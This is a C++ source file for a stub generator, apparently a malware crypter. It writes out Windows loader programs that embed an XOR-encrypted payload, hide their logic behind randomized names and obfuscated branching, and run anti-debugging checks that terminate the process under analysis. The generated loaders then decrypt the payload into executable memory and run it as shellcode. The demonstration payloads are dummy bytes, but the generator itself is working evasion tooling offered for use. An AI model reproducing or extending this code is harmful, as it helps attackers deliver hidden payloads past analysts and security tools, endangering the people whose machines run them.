#include "branch_style_plugins.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>

using namespace BranchStylePlugins;

class EnhancedStubGeneratorWithBranches {
private:
    std::mt19937_64 rng;
    BranchStyleManager& branchManager;
    
    // Enhanced entropy system with branch obfuscation
    struct BranchObfuscationContext {
        int complexityLevel = 5;        // 1-10 complexity scale
        bool useMixedStyles = true;     // Mix different branch styles
        bool useNestedBranches = true;  // Allow nested branching
        int maxNestingLevel = 3;        // Maximum nesting depth
        bool preferHighComplexity = false; // Prefer complex branches
    };
    
    BranchObfuscationContext branchContext;
    
public:
    EnhancedStubGeneratorWithBranches() 
        : rng(std::chrono::high_resolution_clock::now().time_since_epoch().count()),
          branchManager(BranchStyleManager::getInstance()) {
        branchManager.setSeed(rng());
    }
    
    void setComplexityLevel(int level) {
        branchContext.complexityLevel = std::max(1, std::min(10, level));
    }
    
    void setPreferHighComplexity(bool prefer) {
        branchContext.preferHighComplexity = prefer;
    }
    
    std::string generateObfuscatedVarName(const std::string& prefix = "var") {
        static const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::uniform_int_distribution<> dist(0, chars.length() - 1);
        std::string name = prefix;
        for (int i = 0; i < 8 + (rng() % 8); ++i) {
            name += chars[dist(rng)];
        }
        return name;
    }
    
    // Generate branched decryption logic
    std::string generateBranchedDecryption(const std::string& encryptedData, 
                                         const std::string& key, 
                                         const std::string& outputVar) {
        std::ostringstream ss;
        
        // Create multiple branch contexts for different decryption steps
        std::vector<BranchContext> decryptionSteps;
        
        // Step 1: Key validation with branch obfuscation
        auto keyValidation = BranchUtils::createSimpleConditional(
            key + ".size() > 0 && " + key + ".size() < 1024",
            "/* key is valid */",
            "return;"
        );
        keyValidation.nestingLevel = 1;
        
        // Step 2: Data validation
        auto dataValidation = BranchUtils::createSimpleConditional(
            encryptedData + ".size() > 0",
            "/* data is valid */",
            "return;"
        );
        dataValidation.nestingLevel = 1;
        
        // Step 3: Decryption loop with branched logic
        std::string loopVar = generateObfuscatedVarName("idx");
        auto decryptionLoop = BranchUtils::createLoopContext(
            loopVar,
            encryptedData + ".size()",
            outputVar + "[" + loopVar + "] = " + encryptedData + "[" + loopVar + "] ^ " + key + "[" + loopVar + " % " + key + ".size()];"
        );
        decryptionLoop.condition = loopVar + " < " + encryptedData + ".size()";
        decryptionLoop.nestingLevel = 1;
        
        ss << "    // Branched decryption with multiple obfuscation layers\n";
        ss << "    std::vector<uint8_t> " << outputVar << "(" << encryptedData << ".size());\n\n";
        
        // Generate validation branches
        auto validationPlugin = getAppropriateBranchPlugin(keyValidation);
        if (validationPlugin) {
            ss << "    // Key validation using " << validationPlugin->getName() << " style\n";
            ss << validationPlugin->generateBranch(keyValidation) << "\n\n";
        }
        
        auto dataValidationPlugin = getAppropriateBranchPlugin(dataValidation);
        if (dataValidationPlugin) {
            ss << "    // Data validation using " << dataValidationPlugin->getName() << " style\n";
            ss << dataValidationPlugin->generateBranch(dataValidation) << "\n\n";
        }
        
        // Generate decryption loop with branching
        auto loopPlugin = getAppropriateBranchPlugin(decryptionLoop);
        if (loopPlugin) {
            ss << "    // Decryption loop using " << loopPlugin->getName() << " style\n";
            ss << loopPlugin->generateBranch(decryptionLoop) << "\n\n";
        }
        
        return ss.str();
    }
    
    // Generate anti-debugging checks with branch obfuscation
    std::string generateBranchedAntiDebug() {
        std::ostringstream ss;
        
        // Multiple anti-debug checks with different branch styles
        std::vector<std::string> debugChecks = {
            "IsDebuggerPresent()",
            "CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent) && debuggerPresent",
            "GetTickCount64() - startTime > 100",  // Timing check
            "NtQueryInformationProcess != nullptr"  // API check
        };
        
        std::vector<std::string> responses = {
            "ExitProcess(1);",
            "TerminateProcess(GetCurrentProcess(), 1);",
            "exit(1);",
            "abort();"
        };
        
        ss << "    // Anti-debugging checks with branched obfuscation\n";
        ss << "    BOOL debuggerPresent = FALSE;\n";
        ss << "    uint64_t startTime = GetTickCount64();\n";
        ss << "    auto NtQueryInformationProcess = GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueryInformationProcess\");\n\n";
        
        for (size_t i = 0; i < debugChecks.size(); ++i) {
            auto antiDebugContext = BranchUtils::createSimpleConditional(
                debugChecks[i],
                responses[i % responses.size()],
                "/* continue execution */"
            );
            antiDebugContext.nestingLevel = 1;
            
            auto plugin = getAppropriateBranchPlugin(antiDebugContext);
            if (plugin) {
                ss << "    // Anti-debug check " << (i + 1) << " using " << plugin->getName() << " style\n";
                ss << plugin->generateBranch(antiDebugContext) << "\n\n";
            }
        }
        
        return ss.str();
    }
    
    // Generate payload execution with multiple branch styles
    std::string generateBranchedPayloadExecution(const std::string& payloadVar) {
        std::ostringstream ss;
        
        // Create execution context with multiple checks
        std::vector<std::string> executionConditions = {
            payloadVar + ".size() > 0",
            payloadVar + ".data() != nullptr",
            "GetCurrentProcessId() > 0",
            "VirtualAlloc != nullptr"
        };
        
        ss << "    // Branched payload execution\n";
        ss << "    LPVOID execMem = VirtualAlloc(nullptr, " << payloadVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        
        // Generate nested execution checks
        for (size_t i = 0; i < executionConditions.size(); ++i) {
            std::string action;
            if (i == executionConditions.size() - 1) {
                action = "memcpy(execMem, " + payloadVar + ".data(), " + payloadVar + ".size()); "
                        "FlushInstructionCache(GetCurrentProcess(), execMem, " + payloadVar + ".size()); "
                        "((void(*)())execMem)();";
            } else {
                action = "/* validation passed */";
            }
            
            auto execContext = BranchUtils::createSimpleConditional(
                executionConditions[i],
                action,
                "VirtualFree(execMem, 0, MEM_RELEASE); return;"
            );
            execContext.nestingLevel = 1 + i;
            
            auto plugin = getAppropriateBranchPlugin(execContext);
            if (plugin) {
                ss << "    // Execution check " << (i + 1) << " using " << plugin->getName() << " style\n";
                ss << plugin->generateBranch(execContext) << "\n\n";
            }
        }
        
        ss << "    VirtualFree(execMem, 0, MEM_RELEASE);\n";
        
        return ss.str();
    }
    
    // Generate complete obfuscated stub with branch styles
    std::string generateEnhancedStub(const std::vector<uint8_t>& payload, const std::string& key) {
        std::ostringstream ss;
        
        // Generate obfuscated variable names
        std::string encDataVar = generateObfuscatedVarName("enc_data");
        std::string keyVar = generateObfuscatedVarName("key");
        std::string decryptedVar = generateObfuscatedVarName("decrypted");
        std::string mainFuncName = generateObfuscatedVarName("main_func");
        
        // Header with includes
        ss << "#include <windows.h>\n";
        ss << "#include <vector>\n";
        ss << "#include <string>\n";
        ss << "#include <iostream>\n";
        ss << "#include <functional>\n";
        ss << "#include <array>\n";
        ss << "#include <stdexcept>\n\n";
        
        // Generate obfuscated encrypted data
        ss << "// Encrypted payload data\n";
        ss << "static const std::vector<uint8_t> " << encDataVar << " = {\n    ";
        for (size_t i = 0; i < payload.size(); ++i) {
            if (i > 0 && i % 16 == 0) ss << "\n    ";
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)payload[i];
            if (i < payload.size() - 1) ss << ", ";
        }
        ss << "\n};\n\n";
        
        // Generate obfuscated key
        ss << "// Decryption key\n";
        ss << "static const std::string " << keyVar << " = \"" << key << "\";\n\n";
        
        // Main function with branched logic
        ss << "void " << mainFuncName << "() {\n";
        
        // Anti-debugging with branches
        ss << generateBranchedAntiDebug();
        
        // Decryption with branches
        ss << generateBranchedDecryption(encDataVar, keyVar, decryptedVar);
        
        // Payload execution with branches
        ss << generateBranchedPayloadExecution(decryptedVar);
        
        ss << "}\n\n";
        
        // Entry point with branch obfuscation
        auto entryContext = BranchUtils::createSimpleConditional(
            "GetModuleHandleA(nullptr) != nullptr",
            mainFuncName + "();",
            "ExitProcess(1);"
        );
        
        ss << "int main() {\n";
        auto entryPlugin = getAppropriateBranchPlugin(entryContext);
        if (entryPlugin) {
            ss << "    // Entry point using " << entryPlugin->getName() << " style\n";
            ss << entryPlugin->generateBranch(entryContext) << "\n";
        }
        ss << "    return 0;\n";
        ss << "}\n";
        
        return ss.str();
    }
    
    // Generate complex stub with mixed branch styles
    std::string generateComplexMixedStub(const std::vector<uint8_t>& payload, const std::string& key) {
        std::ostringstream ss;
        
        ss << "// Complex stub with mixed branch styles for maximum obfuscation\n\n";
        ss << "#include <windows.h>\n";
        ss << "#include <vector>\n";
        ss << "#include <string>\n";
        ss << "#include <functional>\n";
        ss << "#include <array>\n";
        ss << "#include <stdexcept>\n";
        ss << "#include <chrono>\n\n";
        
        // Generate multiple validation functions with different branch styles
        for (int i = 0; i < 3; ++i) {
            std::string funcName = generateObfuscatedVarName("validate");
            ss << "bool " << funcName << "(int param) {\n";
            
            auto context = BranchUtils::createSimpleConditional(
                "param > " + std::to_string(i * 10),
                "return true;",
                "return false;"
            );
            context.nestingLevel = 1;
            
            // Use different complexity levels for each function
            auto plugins = branchManager.getPluginsByComplexity(1 + i * 3, 4 + i * 3);
            if (!plugins.empty()) {
                std::uniform_int_distribution<> dist(0, plugins.size() - 1);
                auto plugin = plugins[dist(rng)];
                ss << "    // Using " << plugin->getName() << " style (complexity " 
                   << plugin->getComplexityScore() << ")\n";
                ss << plugin->generateBranch(context) << "\n";
            }
            
            ss << "}\n\n";
        }
        
        // Main obfuscated function
        ss << "void obfuscatedMain() {\n";
        ss << "    // Complex branched execution flow\n";
        
        // Generate a complex branch pattern
        auto complexContext = BranchUtils::createSimpleConditional(
            "std::chrono::steady_clock::now().time_since_epoch().count() > 0",
            "/* payload execution */",
            "ExitProcess(1);"
        );
        
        std::string complexBranch = branchManager.generateComplexBranch(complexContext, 3);
        ss << complexBranch << "\n";
        
        ss << "}\n\n";
        
        ss << "int main() {\n";
        ss << "    obfuscatedMain();\n";
        ss << "    return 0;\n";
        ss << "}\n";
        
        return ss.str();
    }
    
private:
    BranchStylePlugin* getAppropriateBranchPlugin(const BranchContext& context) {
        if (branchContext.preferHighComplexity) {
            auto highComplexityPlugins = branchManager.getPluginsByComplexity(7, 10);
            if (!highComplexityPlugins.empty()) {
                std::uniform_int_distribution<> dist(0, highComplexityPlugins.size() - 1);
                auto plugin = highComplexityPlugins[dist(rng)];
                if (plugin->isApplicable(context)) {
                    return plugin;
                }
            }
        }
        
        // Fallback to complexity-appropriate plugin
        int minComplexity = std::max(1, branchContext.complexityLevel - 2);
        int maxComplexity = std::min(10, branchContext.complexityLevel + 2);
        
        auto plugins = branchManager.getPluginsByComplexity(minComplexity, maxComplexity);
        if (plugins.empty()) {
            return branchManager.getRandomPlugin(context);
        }
        
        std::uniform_int_distribution<> dist(0, plugins.size() - 1);
        auto plugin = plugins[dist(rng)];
        return plugin->isApplicable(context) ? plugin : branchManager.getRandomPlugin(context);
    }
};

// Usage example and CLI interface
int main(int argc, char* argv[]) {
    std::cout << "Enhanced Stub Generator with Branch Style Plugins\n";
    std::cout << "================================================\n\n";
    
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <mode> [options]\n\n";
        std::cout << "Modes:\n";
        std::cout << "  demo          - Run demonstration of branch styles\n";
        std::cout << "  generate      - Generate obfuscated stub\n";
        std::cout << "  complex       - Generate complex mixed-style stub\n";
        std::cout << "  benchmark     - Benchmark different branch styles\n\n";
        return 1;
    }
    
    std::string mode = argv[1];
    EnhancedStubGeneratorWithBranches generator;
    
    if (mode == "demo") {
        std::cout << "Demonstrating branch style integration...\n\n";
        
        // Example payload (dummy data)
        std::vector<uint8_t> dummyPayload = {0x48, 0x31, 0xc0, 0xc3}; // xor rax,rax; ret
        std::string key = "example_key_123";
        
        std::cout << "=== Basic Enhanced Stub ===\n";
        std::string basicStub = generator.generateEnhancedStub(dummyPayload, key);
        std::cout << basicStub << "\n\n";
        
        std::cout << "=== Complex Mixed-Style Stub ===\n";
        generator.setComplexityLevel(8);
        generator.setPreferHighComplexity(true);
        std::string complexStub = generator.generateComplexMixedStub(dummyPayload, key);
        std::cout << complexStub << "\n\n";
        
    } else if (mode == "generate") {
        std::cout << "Generating obfuscated stub with branch styles...\n";
        
        // In a real implementation, you would read the payload from a file
        std::vector<uint8_t> payload = {0x90, 0x90, 0x90, 0xc3}; // nop; nop; nop; ret
        std::string key = "obfuscation_key_456";
        
        std::string stub = generator.generateEnhancedStub(payload, key);
        
        std::ofstream outFile("enhanced_stub_with_branches.cpp");
        outFile << stub;
        outFile.close();
        
        std::cout << "Generated stub saved to: enhanced_stub_with_branches.cpp\n";
        
    } else if (mode == "complex") {
        std::cout << "Generating complex mixed-style stub...\n";
        
        generator.setComplexityLevel(9);
        generator.setPreferHighComplexity(true);
        
        std::vector<uint8_t> payload = {0x48, 0x89, 0xe5, 0xc3}; // mov rbp,rsp; ret
        std::string key = "complex_key_789";
        
        std::string complexStub = generator.generateComplexMixedStub(payload, key);
        
        std::ofstream outFile("complex_mixed_stub.cpp");
        outFile << complexStub;
        outFile.close();
        
        std::cout << "Generated complex stub saved to: complex_mixed_stub.cpp\n";
        
    } else if (mode == "benchmark") {
        std::cout << "Benchmarking different branch styles...\n\n";
        
        auto& manager = BranchStyleManager::getInstance();
        auto context = BranchUtils::createSimpleConditional("x > 0", "action();", "fallback();");
        
        // Test each plugin type
        std::vector<BranchStyleType> types = {
            BranchStyleType::CONDITIONAL,
            BranchStyleType::SWITCH,
            BranchStyleType::LOOP,
            BranchStyleType::FUNCTION,
            BranchStyleType::EXCEPTION,
            BranchStyleType::GOTO,
            BranchStyleType::COMPUTED
        };
        
        for (auto type : types) {
            auto plugins = manager.getPluginsByType(type);
            std::cout << "Type: " << static_cast<int>(type) << " (" << plugins.size() << " plugins)\n";
            
            for (auto plugin : plugins) {
                auto start = std::chrono::high_resolution_clock::now();
                if (plugin->isApplicable(context)) {
                    std::string result = plugin->generateBranch(context);
                    auto end = std::chrono::high_resolution_clock::now();
                    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
                    
                    std::cout << "  " << plugin->getName() 
                              << " (complexity " << plugin->getComplexityScore() << "): "
                              << duration.count() << " μs, "
                              << result.length() << " chars\n";
                }
            }
            std::cout << "\n";
        }
        
    } else {
        std::cout << "Unknown mode: " << mode << "\n";
        return 1;
    }
    
    return 0;
}